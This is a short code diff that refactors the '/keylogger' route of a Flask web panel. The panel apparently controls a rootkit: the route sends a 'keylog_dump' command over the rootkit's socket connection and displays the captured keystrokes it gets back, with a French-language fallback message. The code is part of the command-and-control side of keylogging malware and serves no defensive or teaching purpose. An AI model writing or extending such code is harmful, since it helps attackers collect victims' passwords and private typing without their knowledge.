@@ -1,16 +1,20 @@
+from app import app
+import config as cfg
+from flask import render_template, redirect, url_for
+
 # -------------------------------- KEYLOGGER -------------------------------- #
 
 @app.route('/keylogger')
 def keylogger():
-    if not authenticated:
+    if not cfg.authenticated:
         return redirect(url_for('login'))
     try:
-        with connection_lock:
-            if rootkit_connection:
-                rootkit_connection.sendall(b"keylog_dump\n")
-                rootkit_connection.settimeout(2)
-                data = rootkit_connection.recv(BUFFER_SIZE).decode()
-                rootkit_connection.settimeout(None)
+        with cfg.connection_lock:
+            if cfg.rootkit_connection:
+                cfg.rootkit_connection.sendall(b"keylog_dump\n")
+                cfg.rootkit_connection.settimeout(2)
+                data = cfg.rootkit_connection.recv(cfg.BUFFER_SIZE).decode()
+                cfg.rootkit_connection.settimeout(None)
                 keylog_data = data.strip()
             else:
                 keylog_data = "Aucune connexion au rootkit."
